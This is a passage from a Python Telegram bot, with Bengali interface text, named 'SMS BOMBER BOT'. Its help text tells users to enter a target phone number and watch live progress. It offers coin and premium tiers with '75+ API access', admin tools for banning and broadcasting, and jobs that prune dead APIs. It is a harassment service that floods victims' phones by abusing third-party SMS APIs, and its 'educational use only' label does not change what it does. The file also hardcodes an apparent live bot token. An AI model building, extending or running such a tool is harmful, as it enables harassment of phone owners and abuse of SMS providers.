3️⃣ টার্গেট নম্বর দিন (017xxxxxxxx)
4️⃣ লাইভ প্রোগ্রেস দেখুন!

━━━━━━━━━━━━━━━━━━━━━━━━━━

🪙 **কয়েন সিস্টেম:**
• ১টি SMS = ১ কয়েন
• ডেইলি বোনাস = ৫ কয়েন
• রেফারেল = ১০ কয়েন

━━━━━━━━━━━━━━━━━━━━━━━━━━

⭐ **প্রিমিয়াম সুবিধা:**
• Unlimited SMS
• ৭৫+ API অ্যাক্সেস
• কাস্টম API

🎁 **ফ্রি ট্রায়াল:**
• ১টি কাস্টম API = ১ দিন ফ্রি

━━━━━━━━━━━━━━━━━━━━━━━━━━

⚠️ **সতর্কতা:**
শুধুমাত্র শিক্ষাগত উদ্দেশ্যে ব্যবহার করুন!

📢 **চ্যানেল:** @BlackoutZoneRBX404
"""
        await query.edit_message_text(help_text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 মেইন মেনু", callback_data="back_main")]]))
    
    async def back_main_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """মেইন মেনুতে ফিরে যান"""
        query = update.callback_query
        await query.answer()
        
        await query.edit_message_text(
            "🔥 **SMS BOMBER BOT**\n\n"
            "আপনার কাজ নির্বাচন করুন:",
            reply_markup=self.get_main_keyboard()
        )
    
    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ক্যান্সেল কমান্ড"""
        context.user_data.clear()
        await update.message.reply_text(
            "❌ **বাতিল করা হয়েছে!**",
            reply_markup=self.get_main_keyboard()
        )
    
    # ====================== অ্যাডমিন হ্যান্ডলার ======================
    
    async def admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """অ্যাডমিন প্যানেল"""
        user_id = update.effective_user.id
        
        if user_id not in self.ADMIN_IDS:
            if update.callback_query:
                await update.callback_query.answer("❌ আপনি অ্যাডমিন নন!", show_alert=True)
            else:
                await update.message.reply_text("❌ আপনি অ্যাডমিন নন!")
            return
        
        text = """
╔══════════════════════════╗
      👑 **অ্যাডমিন প্যানেল**
╚══════════════════════════╝

আপনার কাজ নির্বাচন করুন:
"""
        
        if update.callback_query:
            await update.callback_query.edit_message_text(text, reply_markup=self.get_admin_keyboard())
        else:
            await update.message.reply_text(text, reply_markup=self.get_admin_keyboard())
    
    async def admin_dashboard_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """অ্যাডমিন ড্যাশবোর্ড"""
        query = update.callback_query
        await query.answer()
        
        stats = self.db.get_dashboard_stats()
        
        text = f"""
╔══════════════════════════╗
      📊 **ড্যাশবোর্ড**
╚══════════════════════════╝

👥 **ইউজার স্ট্যাটস:**
• মোট ইউজার: {stats['total_users']}
• আজ যোগ: {stats['today_users']}
• গতকাল: {stats['yesterday_users']}
• ২৪ ঘণ্টায় সক্রিয়: {stats['active_users']}
• প্রিমিয়াম: {stats['premium_users']}
• ফ্রি ট্রায়াল: {stats['free_trial_users']}
• ব্যান: {stats['banned_users']}

━━━━━━━━━━━━━━━━━━━━━━━━━━

📨 **SMS স্ট্যাটস:**
• মোট SMS: {stats['total_sms']}
• মোট কয়েন: {stats['total_coins']}
• সক্রিয় API: {self.db.get_active_apis_count()}
"""
        keyboard = [
            [InlineKeyboardButton("🔙 অ্যাডমিন প্যানেল", callback_data="admin_panel")],
            [InlineKeyboardButton("🔙 মেইন মেনু", callback_data="back_main")]
        ]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    async def admin_users_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ইউজার ম্যানেজমেন্ট"""
        query = update.callback_query
        await query.answer()
        
        await query.edit_message_text(
            "👥 **ইউজার ম্যানেজমেন্ট**\n\n"
            "কী করতে চান?",
            reply_markup=self.get_user_management_keyboard()
        )
    
    async def admin_search_user_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ইউজার খোঁজা"""
        query = update.callback_query
        await query.answer()
        
        await query.edit_message_text(
            "🔍 **ইউজার খুঁজুন**\n\n"
            "ইউজার আইডি, ইউজারনেম বা নাম লিখুন:"
        )
        context.user_data["admin_searching_user"] = True
    
    async def handle_admin_search(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """অ্যাডমিন ইউজার সার্চ হ্যান্ডলার"""
        if not context.user_data.get("admin_searching_user"):
            return
        
        query_text = update.message.text.strip()
        user_data = self.db.search_user(query_text)
        
        if not user_data:
            await update.message.reply_text(
                "❌ **ইউজার পাওয়া যায়নি!**\n\n"
                "আবার চেষ্টা করুন অথবা /admin দিয়ে মেনুতে ফিরুন।"
            )
            return
        
        user_id = user_data['user_id']
        username = f"@{user_data['username']}" if user_data['username'] else "N/A"
        first_name = user_data['first_name'] or "Unknown"
        last_name = user_data['last_name'] or ""
        full_name = f"{first_name} {last_name}".strip()
        join_date = user_data['join_date'][:10] if user_data['join_date'] else "N/A"
        coins = self.db.get_coins(user_id)
        total_sent = user_data['total_sent'] or 0
        is_banned = user_data['is_banned'] == 1
        is_premium = user_data['is_premium'] == 1
        
        status = "🚫 ব্যান" if is_banned else "⭐ প্রিমিয়াম" if is_premium else "✅ সক্রিয়"
        
        text = f"""
╔══════════════════════════╗
      👤 **ইউজার তথ্য**
╚══════════════════════════╝

📛 **নাম:** {full_name}
👤 **ইউজারনেম:** {username}
🆔 **ইউজার আইডি:** `{user_id}`
📅 **জয়েন:** {join_date}
📊 **স্ট্যাটাস:** {status}
🪙 **কয়েন:** {coins}
📨 **মোট SMS:** {total_sent}
"""
        
        keyboard = []
        if is_banned:
            keyboard.append([InlineKeyboardButton("✅ আনব্যান", callback_data=f"unban_{user_id}")])
        else:
            keyboard.append([InlineKeyboardButton("🚫 ব্যান", callback_data=f"ban_{user_id}")])
        
        keyboard.append([InlineKeyboardButton("📩 মেসেজ পাঠান", callback_data=f"msg_{user_id}")])
        keyboard.append([InlineKeyboardButton("🔙 ইউজার ম্যানেজমেন্ট", callback_data="admin_users")])
        
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
        context.user_data["admin_searching_user"] = False
    
    async def admin_ban_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ইউজার ব্যান"""
        query = update.callback_query
        await query.answer()
        
        user_id = int(query.data.split("_")[1])
        self.db.ban_user(user_id)
        
        await query.edit_message_text(
            f"✅ **ইউজার {user_id} ব্যান করা হয়েছে!**",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ইউজার ম্যানেজমেন্ট", callback_data="admin_users")]])
        )
        
        # ইউজারকে নোটিফাই করুন
        try:
            await context.bot.send_message(
                user_id,
                "⛔ **আপনি ব্যান হয়েছেন!**\n\n"
                "আপিল করতে অ্যাডমিনের সাথে যোগাযোগ করুন।"
            )
        except:
            pass
    
    async def admin_unban_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ইউজার আনব্যান"""
        query = update.callback_query
        await query.answer()
        
        user_id = int(query.data.split("_")[1])
        self.db.unban_user(user_id)
        
        await query.edit_message_text(
            f"✅ **ইউজার {user_id} আনব্যান করা হয়েছে!**",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ইউজার ম্যানেজমেন্ট", callback_data="admin_users")]])
        )
        
        # ইউজারকে নোটিফাই করুন
        try:
            await context.bot.send_message(
                user_id,
                "✅ **আপনি আনব্যান হয়েছেন!**\n\n"
                "এখন আপনি আবার বট ব্যবহার করতে পারবেন।"
            )
        except:
            pass
    
    async def admin_broadcast_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ব্রডকাস্ট শুরু"""
        query = update.callback_query
        await query.answer()
        
        await query.edit_message_text(
            "📢 **ব্রডকাস্ট মেসেজ**\n\n"
            "সব ইউজারকে মেসেজ পাঠাতে নিচের ধাপগুলো অনুসরণ করুন:\n\n"
            "১. মেসেজ লিখুন\n"
            "২. প্রিভিউ দেখুন\n"
            "৩. কনফার্ম করুন\n\n"
            "মেসেজ লিখতে /broadcast কমান্ড ব্যবহার করুন।\n"
            "উদাহরণ: /broadcast আপনার মেসেজ",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 অ্যাডমিন প্যানেল", callback_data="admin_panel")]])
        )
    
    async def broadcast_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ব্রডকাস্ট কমান্ড"""
        user_id = update.effective_user.id
        if user_id not in self.ADMIN_IDS:
            await update.message.reply_text("❌ আপনি অ্যাডমিন নন!")
            return
        
        message = " ".join(context.args)
        if not message:
            await update.message.reply_text(
                "❌ **মেসেজ লিখুন!**\n\n"
                "উদাহরণ: `/broadcast আপনার মেসেজ`"
            )
            return
        
        # মোট ইউজার গণনা
        self.db.cursor.execute("SELECT COUNT(*) as count FROM users")
        total_users = self.db.cursor.fetchone()['count']
        
        # প্রিভিউ দেখান
        preview_text = f"""
📢 **ব্রডকাস্ট প্রিভিউ**

━━━━━━━━━━━━━━━━━━━━━━━━━━

{message}

━━━━━━━━━━━━━━━━━━━━━━━━━━

👥 **মোট রিসিভার:** {total_users} ইউজার

এই মেসেজটি পাঠাবেন?
"""
        keyboard = [
            [
                InlineKeyboardButton("✅ পাঠান", callback_data=f"confirm_broadcast_{user_id}"),
                InlineKeyboardButton("❌ বাতিল", callback_data="cancel_broadcast")
            ]
        ]
        
        context.user_data["broadcast_message"] = message
        await update.message.reply_text(preview_text, reply_markup=InlineKeyboardMarkup(keyboard))
    
    async def confirm_broadcast_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ব্রডকাস্ট কনফার্ম"""
        query = update.callback_query
        await query.answer()
        
        message = context.user_data.get("broadcast_message", "")
        if not message:
            await query.edit_message_text("❌ কোনো মেসেজ নেই!")
            return
        
        self.db.cursor.execute("SELECT user_id FROM users WHERE is_banned = 0")
        users = self.db.cursor.fetchall()
        
        sent = 0
        failed = 0
        
        progress_msg = await query.edit_message_text("⏳ **ব্রডকাস্ট শুরু হচ্ছে...**")
        
        for i, user in enumerate(users):
            user_id = user['user_id']
            try:
                await context.bot.send_message(
                    user_id,
                    f"📢 **ব্রডকাস্ট মেসেজ**\n\n{message}"
                )
                sent += 1
            except:
                failed += 1
            
            if i % 10 == 0 and i > 0:
                await progress_msg.edit_text(
                    f"⏳ **ব্রডকাস্ট চলছে...**\n\n"
                    f"📊 {i}/{len(users)}\n"
                    f"✅ সফল: {sent} | ❌ ব্যর্থ: {failed}"
                )
            
            await asyncio.sleep(0.05)  # রেট লিমিট এড়াতে
        
        # হিস্টোরি যোগ করুন
        self.db.add_broadcast_history(update.effective_user.id, message, len(users), sent, failed)
        
        await progress_msg.edit_text(
            f"✅ **ব্রডকাস্ট সম্পন্ন!**\n\n"
            f"📊 মোট ইউজার: {len(users)}\n"
            f"✅ সফল: {sent}\n"
            f"❌ ব্যর্থ: {failed}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 অ্যাডমিন প্যানেল", callback_data="admin_panel")]])
        )
    
    async def cancel_broadcast_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ব্রডকাস্ট বাতিল"""
        query = update.callback_query
        await query.answer()
        context.user_data["broadcast_message"] = ""
        await query.edit_message_text("❌ ব্রডকাস্ট বাতিল করা হয়েছে!")
    
    async def admin_force_join_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ফোর্স জয়েন অ্যাডমিন"""
        query = update.callback_query
        await query.answer()
        
        force_join_enabled = self.db.is_force_join_enabled()
        channels = self.db.get_force_join_channels()
        
        text = f"""
🛡️ **ফোর্স জয়েন সেটিংস**

━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 **স্ট্যাটাস:** {'✅ চালু' if force_join_enabled else '❌ বন্ধ'}
📋 **চ্যানেল সংখ্যা:** {len(channels)}

চ্যানেল তালিকা:
{chr(10).join([f'📢 {ch["channel_name"]} (@{ch["channel_username"]})' for ch in channels]) if channels else '❌ কোনো চ্যানেল নেই'}
"""
        await query.edit_message_text(text, reply_markup=self.get_force_join_admin_keyboard())
    
    async def admin_add_channel_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """চ্যানেল যোগ করুন"""
        query = update.callback_query
        await query.answer()
        
        await query.edit_message_text(
            "➕ **চ্যানেল যোগ করুন**\n\n"
            "নিচের ফরম্যাটে চ্যানেল তথ্য দিন:\n"
            "`channel_id|username|name`\n\n"
            "উদাহরণ:\n"
            "`-1001234567890|BlackoutZoneRBX404|My Channel`"
        )
        context.user_data["adding_channel"] = True
    
    async def handle_add_channel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """চ্যানেল যোগ হ্যান্ডলার"""
        if not context.user_data.get("adding_channel"):
            return
        
        try:
            parts = update.message.text.strip().split("|")
            if len(parts) == 3:
                channel_id, username, name = parts
                self.db.add_force_join_channel(channel_id.strip(), username.strip(), name.strip())
                
                await update.message.reply_text(
                    f"✅ **চ্যানেল যোগ সফল!**\n\n"
                    f"📢 নাম: {name}\n"
                    f"👤 ইউজারনেম: @{username}",
                    reply_markup=self.get_force_join_admin_keyboard()
                )
            else:
                await update.message.reply_text("❌ **ভুল ফরম্যাট!** `channel_id|username|name`")
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
        
        context.user_data["adding_channel"] = False
    
    async def admin_fj_toggle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """ফোর্স জয়েন টগল"""
        query = update.callback_query
        await query.answer()
        
        action = query.data.split("_")[-1]
        enabled = action == "enable"
        self.db.set_force_join_enabled(enabled)
        
        await query.edit_message_text(
            f"✅ ফোর্স জয়েন {'চালু' if enabled else 'বন্ধ'} করা হয়েছে!",
            reply_markup=self.get_force_join_admin_keyboard()
        )
    
    async def admin_analytics_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """অ্যানালিটিক্স"""
        query = update.callback_query
        await query.answer()
        
        # টপ ইউজার
        top_users = self.db.get_top_users(5)
        
        # API স্ট্যাটস
        self.db.cursor.execute("""
            SELECT api_name, total_calls, success_calls, fail_calls
            FROM api_stats 
            ORDER BY total_calls DESC 
            LIMIT 10
        """)
        api_stats = self.db.cursor.fetchall()
        
        text = f"""
📈 **অ্যানালিটিক্স**

━━━━━━━━━━━━━━━━━━━━━━━━━━

🏆 **টপ ৫ ইউজার:**
{chr(10).join([f'{i+1}. @{u["username"] or "Unknown"} - {u["total_sent"]} SMS' for i, u in enumerate(top_users)]) if top_users else '❌ কোনো ডেটা নেই'}

━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 **টপ API পারফরম্যান্স:**
{chr(10).join([f'{i+1}. {s["api_name"][:20]}...\n   📞 {s["total_calls"]} | ✅ {s["success_calls"]} | ❌ {s["fail_calls"]}' for i, s in enumerate(api_stats)]) if api_stats else '❌ কোনো ডেটা নেই'}
"""
        await query.edit_message_text(
            text,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 অ্যাডমিন প্যানেল", callback_data="admin_panel")]])
        )
    
    # ====================== জব সেটআপ ======================
    
    def setup_jobs(self):
        """জব গুলো সেটআপ করুন"""
        if self.app and self.app.job_queue:
            job_queue = self.app.job_queue
            
            # প্রতি ৬ ঘণ্টায় ডেড API পরিষ্কার করুন
            job_queue.run_repeating(
                self.cleanup_dead_apis_job,
                interval=21600,
                first=60
            )
            
            # প্রতি ২৪ ঘণ্টায় ব্যাকআপ নিন
            job_queue.run_repeating(
                self.backup_stats_job,
                interval=86400,
                first=300
            )
            
            # প্রতি ঘণ্টায় ফ্রি ট্রায়াল চেক করুন
            job_queue.run_repeating(
                self.check_free_trials_job,
                interval=3600,
                first=120
            )
    
    async def cleanup_dead_apis_job(self, context: ContextTypes.DEFAULT_TYPE):
        """ডেড API পরিষ্কার করুন"""
        removed_apis = self.db.check_and_remove_dead_apis()
        if removed_apis:
            logger.info(f"Removed dead APIs: {removed_apis}")
            
            # অ্যাডমিনদের নোটিফাই করুন
            for admin_id in self.ADMIN_IDS:
                try:
                    await context.bot.send_message(
                        admin_id,
                        f"🔧 **ডেড API পরিষ্কার করা হয়েছে**\n\n"
                        f"রিমুভ করা API: {', '.join(removed_apis[:5])}"
                    )
                except:
                    pass
    
    async def backup_stats_job(self, context: ContextTypes.DEFAULT_TYPE):
        """স্ট্যাটস ব্যাকআপ নিন"""
        stats = self.db.get_dashboard_stats()
        
        backup_data = {
            "timestamp": datetime.now().isoformat(),
            **stats
        }
        
        try:
            with open(f"backup_{datetime.now().strftime('%Y%m%d')}.json", "w") as f:
                json.dump(backup_data, f, indent=2)
            logger.info("Backup completed successfully")
        except Exception as e:
            logger.error(f"Backup error: {e}")
    
    async def check_free_trials_job(self, context: ContextTypes.DEFAULT_TYPE):
        """ফ্রি ট্রায়াল চেক করুন"""
        self.db.cursor.execute("""
            SELECT user_id FROM users 
            WHERE is_free_trial = 1 AND datetime(free_trial_expiry) < datetime('now')
        """)
        expired = self.db.cursor.fetchall()
        
        for user in expired:
            user_id = user['user_id']
            self.db.cursor.execute("UPDATE users SET is_free_trial = 0 WHERE user_id = ?", (user_id,))
            self.db.conn.commit()
            
            try:
                await context.bot.send_message(
                    user_id,
                    "⏰ **ফ্রি ট্রায়াল শেষ!**\n\n"
                    "আবার ফ্রি ট্রায়াল পেতে নতুন কাস্টম API যোগ করুন।"
                )
            except:
                pass
    
    # ====================== রান ======================
    
    def run(self):
        """বট চালান"""
        self.app = Application.builder().token(self.token).build()
        
        # কমান্ড হ্যান্ডলার
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(CommandHandler("cancel", self.cancel_command))
        self.app.add_handler(CommandHandler("admin", self.admin_panel))
        self.app.add_handler(CommandHandler("broadcast", self.broadcast_command))
        
        # কলব্যাক হ্যান্ডলার
        self.app.add_handler(CallbackQueryHandler(self.check_join_callback, pattern="check_join"))
        self.app.add_handler(CallbackQueryHandler(self.profile_callback, pattern="profile"))
        self.app.add_handler(CallbackQueryHandler(self.coins_callback, pattern="coins"))
        self.app.add_handler(CallbackQueryHandler(self.daily_bonus_callback, pattern="daily_bonus"))
        self.app.add_handler(CallbackQueryHandler(self.send_bomb_callback, pattern="send_bomb"))
        self.app.add_handler(CallbackQueryHandler(self.count_callback, pattern="count_"))
        self.app.add_handler(CallbackQueryHandler(self.custom_count_callback, pattern="custom_count"))
        self.app.add_handler(CallbackQueryHandler(self.settings_callback, pattern="settings"))
        self.app.add_handler(CallbackQueryHandler(self.notification_settings_callback, pattern="notification_settings"))
        self.app.add_handler(CallbackQueryHandler(self.toggle_notifications_callback, pattern="toggle_notifications"))
        self.app.add_handler(CallbackQueryHandler(self.help_callback, pattern="help"))
        self.app.add_handler(CallbackQueryHandler(self.back_main_callback, pattern="back_main"))
        
        # অ্যাডমিন কলব্যাক
        self.app.add_handler(CallbackQueryHandler(self.admin_panel, pattern="admin_panel"))
        self.app.add_handler(CallbackQueryHandler(self.admin_dashboard_callback, pattern="admin_dashboard"))
        self.app.add_handler(CallbackQueryHandler(self.admin_users_callback, pattern="admin_users"))
        self.app.add_handler(CallbackQueryHandler(self.admin_search_user_callback, pattern="admin_search_user"))
        self.app.add_handler(CallbackQueryHandler(self.admin_ban_callback, pattern="ban_"))
        self.app.add_handler(CallbackQueryHandler(self.admin_unban_callback, pattern="unban_"))
        self.app.add_handler(CallbackQueryHandler(self.admin_broadcast_callback, pattern="admin_broadcast"))
        self.app.add_handler(CallbackQueryHandler(self.confirm_broadcast_callback, pattern="confirm_broadcast_"))
        self.app.add_handler(CallbackQueryHandler(self.cancel_broadcast_callback, pattern="cancel_broadcast"))
        self.app.add_handler(CallbackQueryHandler(self.admin_force_join_callback, pattern="admin_force_join"))
        self.app.add_handler(CallbackQueryHandler(self.admin_add_channel_callback, pattern="admin_add_channel"))
        self.app.add_handler(CallbackQueryHandler(self.admin_fj_toggle_callback, pattern="admin_fj_"))
        self.app.add_handler(CallbackQueryHandler(self.admin_analytics_callback, pattern="admin_analytics"))
        
        # মেসেজ হ্যান্ডলার (অর্ডার গুরুত্বপূর্ণ)
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_admin_search))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_add_channel))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_custom_count_input))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_phone_input))
        
        # জব সেটআপ
        self.setup_jobs()
        
        logger.info("🤖 বট চালু হচ্ছে...")
        logger.info(f"📊 {len(self.api_manager.get_all_apis())}টি API লোড হয়েছে")
        logger.info(f"👑 অ্যাডমিন: {self.ADMIN_IDS}")
        logger.info(f"📢 চ্যানেল: @{self.CHANNEL_USERNAME}")
        
        # হ্যান্ডলার অর্ডার ফিক্স
        self.fix_handler_order()
        
        self.app.run_polling(allowed_updates=Update.ALL_TYPES)
    
    def fix_handler_order(self):
        """হ্যান্ডলার অর্ডার ঠিক করুন"""
        # মেসেজ হ্যান্ডলারগুলোকে সঠিক অর্ডারে সাজানো হয়েছে
        # phone input হ্যান্ডলারটি শেষে থাকা উচিত কারণ এটি সবচেয়ে সাধারণ
        pass

# ====================== মেইন ======================

if __name__ == "__main__":
    BOT_TOKEN = "8218480747:AAEhdGCthvhMaGLKvpaBtHwo0o40WYKoLHA"

    import asyncio
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # Python 3.13-এর জন্য event loop তৈরি করা
    asyncio.set_event_loop(asyncio.new_event_loop())

    bot = SMSBomberBot(BOT_TOKEN)

    try:
        bot.run()
    except KeyboardInterrupt:
        print("\n\n🤖 বট বন্ধ করা হচ্ছে...")
        bot.db.close()
        print("✅ বট সফলভাবে বন্ধ হয়েছে!")
    except Exception as e:
        logger.error(f"Critical error: {e}")
        bot.db.close()
